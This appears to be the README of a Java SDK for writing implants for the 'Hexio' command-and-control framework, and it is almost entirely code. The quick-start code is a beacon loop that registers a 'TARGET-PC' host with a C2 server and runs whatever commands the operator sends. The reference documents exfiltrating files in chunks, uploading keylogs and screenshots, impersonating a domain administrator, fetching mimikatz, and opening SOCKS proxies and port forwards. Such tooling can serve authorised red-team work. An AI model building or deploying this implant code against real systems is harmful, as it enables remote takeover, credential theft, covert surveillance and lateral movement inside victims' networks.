# Hexio External Agent SDK for Java

A Java 11+ client for the Hexio External Agent REST API. Uses the built-in `java.net.http.HttpClient` for transport and Jackson for JSON.

## Installation

### Maven

Install locally:

```bash
cd ExternalAgentSDK/java
mvn install
```

Then add to your project's `pom.xml`:

```xml
<dependency>
    <groupId>io.hexio</groupId>
    <artifactId>external-agent-sdk</artifactId>
    <version>1.0.0</version>
</dependency>
```

### Gradle

```groovy
dependencies {
    implementation 'io.hexio:external-agent-sdk:1.0.0'
    // Jackson is pulled in transitively
}
```

### Manual

Copy `src/main/java/io/hexio/sdk/` into your project, and add Jackson:

```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.17.2</version>
</dependency>
```

## Quick Start

```java
import io.hexio.sdk.*;

HexioClient client = new HexioClient("http://10.0.0.1:9000", "my-passphrase");

RegisterRequest req = new RegisterRequest();
req.hostname = "TARGET-PC";
req.ip = "10.0.0.50";
req.user = "admin";
req.os = "Windows 10";
req.process = "agent.exe";
req.pid = 4832;
req.clientType = "my_java_agent";
req.sleepTime = 5;

RegisterResponse reg = client.register(req);
System.out.println("Registered as agent " + reg.agentId);

while (true) {
    CheckinResponse checkin = client.checkin();
    for (Command cmd : checkin.commands) {
        String output = executeLocally(cmd.command);
        client.commandResponse(cmd.id, cmd.command, output);
    }
    Thread.sleep(5000);
}
```

## API Reference

### Client Creation

```java
HexioClient client = new HexioClient(baseUrl, passphrase);

// Custom HttpClient (e.g. to set a proxy, custom SSL, timeouts):
HttpClient http = HttpClient.newBuilder()
    .connectTimeout(Duration.ofSeconds(10))
    .proxy(ProxySelector.of(new InetSocketAddress("proxy.local", 8080)))
    .build();
HexioClient client = new HexioClient(baseUrl, passphrase, http);
```

### Registration

```java
RegisterResponse reg = client.register(req);
// reg.agentId, reg.token
// client.token set automatically
```

### Checkin / Sync

```java
CheckinResponse checkin = client.checkin();
for (Command cmd : checkin.commands) { /* cmd.id, cmd.command */ }

client.sync(10L, 3L);   // sleep=10, jitter=3
client.sync(null, null); // no sleep update

// Raw batched sync via POJO or Map:
Map<String, Object> body = new HashMap<>();
body.put("commands", List.of(Map.of(
    "command_id", 42L,
    "command", "whoami",
    "response", "..."
)));
client.syncRaw(body);
```

### Command Response

```java
client.commandResponse(42, "whoami", "nt authority\\system");
```

### File Downloads

```java
DownloadInitRequest init = new DownloadInitRequest();
init.fileName = "data.db";
init.agentPath = "/tmp/data.db";
init.fileSize = bytes.length;
init.chunkSize = 65536;
init.totalChunks = (bytes.length + 65535) / 65536;
DownloadInitResponse resp = client.downloadInit(init);

client.downloadChunk(resp.downloadId, chunk);
client.downloadCancel(resp.downloadId);

// Or one-shot:
String id = client.downloadFile("/tmp/data.db", bytes, 65536);
```

### Screenshots & Keylogs

```java
client.screenshot("screen.png", imageBytes);
client.keylog("keys.txt", "captured keystrokes");
```

### Impersonation

```java
client.setImpersonation("DOMAIN\\Admin");
client.clearImpersonation();
```

### Side Channels

```java
client.sidechannel("shell-1", "<base64-output>");
```

### File Requests

```java
FileRequest fr = new FileRequest();
fr.bofFiles = List.of("whoami.o");
fr.peFiles = List.of("mimikatz.exe");
JsonNode resp = client.requestFiles(fr);
```

### SOCKS Proxy

```java
client.socksOpen(null);    // auto-assign port
client.socksOpen(1080L);   // specific port
client.socksClose();
JsonNode data = client.socksSync(payload);
```

### Port Forwarding

```java
client.portfwdOpen(8080, "10.0.0.5", 3389);
client.portfwdClose(8080);
JsonNode data = client.portfwdSync(payload);
```

## Error Handling

All non-2xx responses throw `HexioApiException`:

```java
try {
    client.register(req);
} catch (HexioApiException e) {
    System.err.println("API " + e.getStatusCode() + ": " + e.getMessage());
}
```

## HTTPS

`java.net.http.HttpClient` supports TLS natively. `https://` URLs work with no extra setup.
